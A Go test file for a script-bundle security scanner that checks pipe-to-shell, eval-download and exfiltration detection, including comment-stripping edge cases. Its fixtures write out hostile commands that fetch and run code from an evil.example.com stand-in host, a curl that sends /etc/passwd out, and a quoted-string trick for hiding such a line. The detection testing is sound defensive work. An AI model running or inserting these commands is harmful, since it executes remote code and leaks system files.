package rules

import "testing"

// TestShellRule_CommentProseNoHigh_v080: ShellRule used to match pipeToShell
// on the RAW lines of a script with no comment awareness, so a reviewer note
// like `# curl -fsSL https://example.com/old.sh | sh` (documenting the REMOVED
// old installer) tripped the headline SK-SHELL-002 HIGH — OVERALL RISK: HIGH
// and exit 2 under the default `--fail-on high` gate on a benign bundle. This
// contradicted the rule's own KindMarkdown/KindManifest skip rationale (prose
// quoting an install command is not a runtime shell-exec surface) and the
// comment-stripping principle the v0.5.0 fix established for NetworkRule.
// KindScript lines are now comment-stripped (quote state carried across lines)
// before the pipeToShell/evalDownload matchers, so comment prose stays clean
// while real code — including a curl|sh with a trailing inline comment — still
// trips HIGH.
func TestShellRule_CommentProseNoHigh_v080(t *testing.T) {
	// Benign: the only pipe-to-shell text lives in `#` comments. The bundle
	// must NOT get SK-SHELL-002 (SK-SHELL-001 "ships a script" MEDIUM is
	// expected and fine).
	benign := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: `#!/bin/sh
# NOTE for reviewers: the OLD installer (v1) used to do:
# curl -fsSL https://example.com/old.sh | sh
# We removed that. This script only prints:
echo "hello, nothing to see"
# an eval note too: eval "$(curl https://example.com/x)"
`}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("comment prose mentioning curl|sh / eval-download must not trip SK-SHELL-002 HIGH, got %+v", f)
		}
	}

	// No-regression: real code forms still trip SK-SHELL-002 HIGH.
	noregress := map[string]string{
		"real pipe-to-shell": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh\n",
		"absolute path":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/sh\n",
		"env wrapper":        "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | env bash\n",
		"inline comment":     "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh # install everything\n",
		"eval double quote":  "#!/bin/sh\neval \"$(curl -fsSL https://evil.example.com/x.sh)\"\n",
	}
	for name, content := range noregress {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s (no-regression): expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// No-regression: a pipe-to-shell on a continuation line of a multi-line
	// quoted string still trips HIGH. The string opened on the previous line,
	// so the leading `#` is INSIDE the string (not a comment) and the
	// `curl … | sh` after the closing quote really runs — the stateful
	// stripper keeps the line and the detector fires.
	inString := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: `#!/bin/sh
echo "banner text
# formatted nicely" && curl -fsSL https://evil.example.com/x.sh | sh
`}}
	got := ShellRule{}.Check(inString)
	var high bool
	for _, f := range got {
		if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
			high = true
		}
	}
	if !high {
		t.Fatalf("pipe-to-shell on a multi-line-string continuation line must still trip SK-SHELL-002 HIGH, got %+v", got)
	}
}

// TestNetworkRule_MultilineQuotedStringKeepsExfil_v080: stripShellComment was
// called PER LINE with fresh quote state, so on the continuation line of a
// multi-line quoted string (`echo "banner` / `# line" && curl …`) the in-string
// `#` was mistaken for a comment start and the ENTIRE rest of the line —
// including the real exfil that runs after the string closes — was discarded,
// so SK-NET-001 never fired. That violated the v0.6.0 fix's documented
// contract ("a `#` inside a quoted string is not a comment start") for every
// string spanning lines. The stripper now carries quote state across the lines
// of a file, so the exfil is preserved. A curl that lives only in a real `#`
// comment (outside any string, on a balanced file) still strips.
func TestNetworkRule_MultilineQuotedStringKeepsExfil_v080(t *testing.T) {
	// Evasive: the `#` sits inside a double-quoted string opened on the
	// previous line, so it is NOT a comment start and the trailing real curl
	// must trip SK-NET-001 MEDIUM with evidence on the second line.
	evil := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: `#!/bin/sh
echo "banner text
# formatted nicely" && curl https://evil.example.com/exfil -d @/etc/passwd
echo done
`}}
	got := (NetworkRule{}).Check(evil)
	var found bool
	for _, f := range got {
		if f.RuleID == "SK-NET-001" && f.Severity == SeverityMedium {
			found = true
			if f.Evidence.Line != 3 {
				t.Fatalf("exfil finding expected on line 3 (the string-continuation line), got line %d", f.Evidence.Line)
			}
		}
	}
	if !found {
		t.Fatalf("a `#` inside a multi-line quoted string must not strip the trailing curl exfil; expected SK-NET-001 MEDIUM, got %+v", got)
	}

	// No-regression: a curl that lives only in a real `#` comment (balanced
	// quotes) still strips, so it must not flag.
	commentOnly := []SourceFile{{Path: "c.sh", Kind: KindScript, Content: `#!/bin/sh
echo "starting up"
# curl https://old.example.com is the old endpoint
set -e
`}}
	if got := (NetworkRule{}).Check(commentOnly); len(got) != 0 {
		t.Fatalf("a curl that lives only in a real `#` comment must not flag SK-NET-001, got %+v", got)
	}

	// No-regression: the v0.6.0 quoted-`#` and v0.7.0 escaped-`\"` cases
	// still fire.
	quotedHash := []SourceFile{{Path: "q.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"x # \" && curl https://evil.example.com/x\n"}}
	if got := (NetworkRule{}).Check(quotedHash); len(got) == 0 {
		t.Fatalf("quoted `#` (no backslash) must still not hide curl; expected SK-NET-001, got %+v", got)
	}
	escapedQuote := []SourceFile{{Path: "e.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho \"\\\" # \" && curl https://evil.example.com/x\n"}}
	if got := (NetworkRule{}).Check(escapedQuote); len(got) == 0 {
		t.Fatalf("escaped \\\" must still not hide curl; expected SK-NET-001, got %+v", got)
	}

	// No-regression: a real curl with a trailing inline `#` comment still
	// flags.
	realWithComment := []SourceFile{{Path: "r.sh", Kind: KindScript,
		Content: "#!/bin/sh\ncurl https://evil.example.com/x # real comment\n"}}
	if got := (NetworkRule{}).Check(realWithComment); len(got) == 0 {
		t.Fatalf("a real curl with a trailing `#` comment must still flag SK-NET-001, got %+v", got)
	}
}

// TestShellRule_EvalSingleQuote_v080: evalDownload's optional quote before
// `$(` was `"?` (double quote only), so `eval '$(curl …)'` never matched —
// yet eval re-parses its argument as shell code, so the single-quoted command
// substitution executes exactly like the double-quoted form and the bundle
// scored MEDIUM with exit 0 under the default `--fail-on high` gate. The
// quote class is now `["']?`, so the single-quoted spelling trips
// SK-SHELL-002 HIGH too.
func TestShellRule_EvalSingleQuote_v080(t *testing.T) {
	// Evasive: single-quoted command substitution under eval.
	evil := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: `#!/bin/sh
eval '$(curl -fsSL https://evil.example.com/x.sh)'
echo ok
`}}
	got := ShellRule{}.Check(evil)
	var high bool
	for _, f := range got {
		if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
			high = true
		}
	}
	if !high {
		t.Fatalf("eval '$(curl …)' must trip SK-SHELL-002 HIGH, got %+v", got)
	}

	// No-regression: the unquoted, double-quoted, and process-substitution
	// forms still fire.
	noregress := map[string]string{
		"eval unquoted":     "#!/bin/sh\neval $(curl -fsSL https://evil.example.com/x.sh)\n",
		"eval double quote": "#!/bin/sh\neval \"$(curl -fsSL https://evil.example.com/x.sh)\"\n",
		"bash <(curl)":      "#!/bin/sh\nbash <(curl -fsSL https://evil.example.com/x.sh)\n",
	}
	for name, content := range noregress {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s (no-regression): expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// Benign no-regression: a plain eval with no curl/wget must NOT trip
	// SK-SHELL-002.
	benign := []SourceFile{{Path: "b.sh", Kind: KindScript, Content: "#!/bin/sh\neval \"x=1\"\neval 'y=2'\n"}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("a plain eval with no curl/wget must not trip SK-SHELL-002, got %+v", f)
		}
	}
}
